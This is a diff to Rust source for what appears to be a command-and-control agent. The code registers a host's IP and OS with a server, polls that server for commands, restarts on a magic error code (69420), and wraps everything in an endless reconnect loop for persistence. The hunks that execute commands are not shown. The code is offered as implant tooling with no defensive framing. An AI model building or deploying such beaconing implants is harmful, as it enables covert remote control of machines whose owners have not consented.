@@ -21,9 +21,9 @@ fn initHost() -> Option<String>{
         ip = "10.1.1.10";
     } else if cfg!(unix) {
         os = "Linux";
-        ip = "10.1.1.10";
+        ip = "10.1.1.92";
     }
-    let text = format!("{{\'IP\': \'{}\', \'OS\': \'{}\'}}",ip,os);
+    let text = format!("{{\"IP\": \"{}\", \"OS\": \"{}\"}}",ip,os);
     let client = reqwest::blocking::Client::new();
     let url = format!("{}/hosts/newHost",server_ip);
     let hostname = match client.post(url).json(&text).send(){
@@ -52,9 +52,12 @@ fn getCommands(identifier:&str){
         }
     };
     let res = format!(r#"{}"#,res);
-    println!("{}",res);
-    let res = json::parse(&res).unwrap();
-    let command_count: i32 = format!("{}",res["command_count"]).parse().unwrap();    
+    print(&res);
+    let res = json::parse(&res).unwrap(); //always will receive json
+    let command_count: i32 = format!("{}",res["command_count"]).parse().unwrap();
+    if command_count == 69420{ //special number sent by server indicating there is an error
+        main_loop(&get_id());
+    }
     let mut count = 1;
     if command_count == 0{
         print("no commands, sleeping");
@@ -171,10 +174,22 @@ fn get_id() -> String {
     }
 }
 
-fn main(){
-    let identifier = get_id();
+fn main_loop(identifier:&str) -> Result<String,String>{
     loop{
         getCommands(&identifier);
         thread::sleep(sleep_time);
+    }
+}
+
+fn main(){
+    loop{
+        let identifier = get_id();
+        match main_loop(&identifier){
+            Ok(_)=>{
+                continue
+            }, Err(_)=>{
+                continue
+            }
+        }
     }
 }
